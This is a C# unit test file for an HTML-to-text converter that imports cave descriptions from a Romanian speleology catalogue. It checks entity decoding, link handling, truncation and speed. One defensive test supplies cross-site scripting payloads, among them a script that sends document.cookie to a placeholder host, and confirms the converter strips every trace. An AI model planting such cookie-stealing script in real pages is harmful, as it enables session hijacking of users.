// SPDX-License-Identifier: AGPL-3.0-or-later
using System.Diagnostics;
using Shouldly;
using SilexGis.Domain.Catalogue;

namespace SilexGis.Domain.Tests;

/// <summary>
/// A foreign catalogue's descriptions, read as the plain text this application stores. Every
/// shape below is one that catalogue actually carries: markup pasted out of a word processor,
/// its editor residue, entities, links — and, in one measured case, a single description of over
/// a megabyte.
/// </summary>
public class HtmlToTextTests
{
    /// <summary>The budget the import runs with, so these read as the real conversion does.</summary>
    private const int Budget = 20_000;

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   \t\n ")]
    [InlineData("<p></p>")]
    [InlineData("<div><span>   </span></div>")]
    [InlineData("<!-- pasted from the old bulletin -->")]
    public void Nothing_readable_is_null_rather_than_an_empty_string(string? html)
    {
        // Null lets a caller leave the field unset. An empty string would make every description
        // that was only markup look like a description somebody wrote and then cleared.
        HtmlToText.Convert(html, Budget).ShouldBeNull();
    }

    [Fact]
    public void Paragraphs_and_line_breaks_survive_the_loss_of_their_markup()
    {
        HtmlToText.Convert("<p>Intrarea</p><p>Galeria mare</p>", Budget)
            .ShouldBe("Intrarea\n\nGaleria mare");
        HtmlToText.Convert("Sus<br/>Jos", Budget).ShouldBe("Sus\nJos");
    }

    [Fact]
    public void A_list_item_keeps_its_bullet_so_a_list_does_not_read_as_prose()
    {
        var text = HtmlToText.Convert("<ul><li>Coardă 40 m</li><li>Două ancore</li></ul>", Budget);

        text.ShouldNotBeNull();
        text.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .ShouldBe(["• Coardă 40 m", "• Două ancore"]);
    }

    [Fact]
    public void Runs_of_blank_lines_collapse_to_one()
    {
        HtmlToText.Convert("Intrare<br><br><br><br>Fund", Budget).ShouldBe("Intrare\n\nFund");
        HtmlToText.Convert("<p>Intrare</p><p></p><p></p><p>Fund</p>", Budget).ShouldBe("Intrare\n\nFund");
    }

    [Fact]
    public void Script_and_style_bodies_are_removed_and_not_merely_their_tags()
    {
        // Removing the tags alone would leave the program text behind as if somebody had written
        // it into the description.
        var text = HtmlToText.Convert(
            "<p>Galerie</p><script>alert('x')</script><style>p { color: red }</style>", Budget);

        text.ShouldBe("Galerie");
    }

    [Fact]
    public void Editor_residue_is_removed_whole()
    {
        // What a description pasted out of a word processor carries: a conditional comment
        // wrapping an xml island, a second island on its own, and namespace tags. None of it is
        // anything a reader wants, and all of it carries text that would otherwise survive.
        var text = HtmlToText.Convert(
            "<!--[if gte mso 9]><xml><o:DocumentProperties><o:Author>redactorul</o:Author>"
            + "</o:DocumentProperties></xml><![endif]-->"
            + "<xml><w:WordDocument><w:View>Normal</w:View></w:WordDocument></xml>"
            + "<p style=\"margin:0cm;line-height:normal\"><w:p>Sala Mare</w:p></p>",
            Budget);

        text.ShouldBe("Sala Mare");
    }

    [Fact]
    public void Entities_are_decoded_and_a_non_breaking_space_becomes_an_ordinary_one()
    {
        // A surviving U+00A0 reaches the reader as an invisible oddity that breaks word wrapping
        // and search alike.
        var text = HtmlToText.Convert("<p>Peștera &amp; Avenul&nbsp;Mare &#8212; 40&#160;m</p>", Budget);

        text.ShouldNotBeNull();
        text.ShouldBe("Peștera & Avenul Mare — 40 m");
        text.ShouldNotContain("\u00a0");
        text.ShouldNotContain("&amp;");
        text.ShouldNotContain("&#");
    }

    [Fact]
    public void An_absolute_link_keeps_both_its_text_and_its_address()
    {
        // "see the survey at …" is information the description depends on, so the address is kept
        // beside the text rather than dropped with the tag.
        HtmlToText.Convert(
            "<p>Vezi <a href=\"https://www.speologie.org/pestera-ursilor\">fișa</a>.</p>", Budget)
            .ShouldBe("Vezi fișa (https://www.speologie.org/pestera-ursilor).");
    }

    [Fact]
    public void A_relative_link_keeps_its_text_and_drops_an_address_that_means_nothing_here()
    {
        var text = HtmlToText.Convert("<p>Vezi <a href=\"/pestera-ursilor\">fișa</a>.</p>", Budget);

        text.ShouldNotBeNull();
        text.ShouldBe("Vezi fișa.");
        text.ShouldNotContain("/pestera-ursilor");
    }

    [Fact]
    public void Text_past_the_budget_is_cut_on_a_word_boundary_and_marked_as_cut()
    {
        var html = string.Concat(Enumerable.Repeat("abcd ", 100));

        var text = HtmlToText.Convert(html, 100);

        text.ShouldNotBeNull();
        text.Length.ShouldBeLessThanOrEqualTo(100 + HtmlToText.TruncationMarker.Length);
        text.ShouldEndWith("abcd" + HtmlToText.TruncationMarker);
    }

    [Fact]
    public void A_cut_with_no_word_boundary_near_it_keeps_the_text_rather_than_the_tidy_ending()
    {
        // A URL, or a table pasted without spaces. Searching back to the last space anywhere
        // would throw away nearly all of what was kept for the sake of ending on a word.
        var html = "Sector " + new string('x', 400);

        var text = HtmlToText.Convert(html, 200);

        text.ShouldNotBeNull();
        text.Length.ShouldBe(200 + HtmlToText.TruncationMarker.Length);
        text.ShouldStartWith("Sector xxx");
    }

    [Fact]
    public void A_description_of_the_size_the_catalogue_actually_carries_returns_promptly()
    {
        // The largest single description measured in the source catalogue is over a megabyte of
        // pasted markup. Converting the whole of it and then keeping the first few thousand
        // characters would spend all the time and all the memory to throw the answer away — this
        // is the case the markup budget exists for, so it is the case worth timing.
        var paragraph = "<p style=\"margin:0cm\">Galerie descendentă cu blocuri prăbușite&nbsp;.</p>";
        var html = string.Concat(Enumerable.Repeat(paragraph, 25_000));
        html.Length.ShouldBeGreaterThan(1_400_000);

        var stopwatch = Stopwatch.StartNew();
        var text = HtmlToText.Convert(html, Budget);
        stopwatch.Stop();

        text.ShouldNotBeNull();
        text.Length.ShouldBeLessThanOrEqualTo(Budget + HtmlToText.TruncationMarker.Length);
        text.ShouldEndWith(HtmlToText.TruncationMarker);
        text.ShouldNotContain("<");

        // Generous on purpose: this box renders and builds under load, and the point of the
        // assertion is that the work is bounded by the budget rather than by the input.
        stopwatch.Elapsed.ShouldBeLessThan(TimeSpan.FromSeconds(5));
    }

    [Fact]
    public void Hostile_markup_leaves_no_markup_behind()
    {
        // This is a converter, not a sanitiser: what it returns is stored and rendered as text,
        // so the test is that nothing survives that any renderer could be asked to interpret.
        var text = HtmlToText.Convert(
            "<div onclick=\"alert('x')\">Intrare</div>"
            + "<a href=\"javascript:alert('x')\">Fișa</a>"
            + "<img src=x onerror=\"alert('x')\">"
            + "<script>fetch('https://elsewhere.example/' + document.cookie)</script>",
            Budget);

        text.ShouldNotBeNull();
        text.ShouldBe("Intrare\nFișa");
        text.ShouldNotContain("<");
        text.ShouldNotContain(">");
        text.ShouldNotContain("alert");
        text.ShouldNotContain("onclick");
        text.ShouldNotContain("onerror");
        text.ShouldNotContain("javascript:");
        text.ShouldNotContain("document.cookie");
    }

    /// <summary>
    /// An inline tag separates nothing, so removing one must join the text either side rather
    /// than put a space between it.
    /// </summary>
    /// <remarks>
    /// This is not a nicety. The catalogue's descriptions were pasted out of word processors and
    /// carry an emphasis or a span around a large share of their phrases, so a converter that
    /// left a space where a tag had been would put one before the full stop of most sentences it
    /// ever converted.
    /// </remarks>
    [Theory]
    [InlineData("<p>O sală <em>largă</em>.</p>", "O sală largă.")]
    [InlineData("<p>Sistemul <strong>Vărășoaia</strong>, la Padiș.</p>", "Sistemul Vărășoaia, la Padiș.")]
    [InlineData("<p>ad<span>ân</span>cime</p>", "adâncime")]
    public void An_inline_tag_joins_the_text_either_side_rather_than_spacing_it(string html, string expected)
    {
        HtmlToText.Convert(html, 500).ShouldBe(expected);
    }

    /// <summary>
    /// Table cells are the exception: they are not a line of their own, and they are not nothing
    /// either — two cells run together read as one word.
    /// </summary>
    [Fact]
    public void Table_cells_are_kept_apart_even_though_they_share_a_line()
    {
        var text = HtmlToText.Convert("<table><tr><td>Padiș</td><td>1367</td></tr></table>", 500);

        text.ShouldNotBeNull();
        text.ShouldContain("Padiș 1367");
    }
}
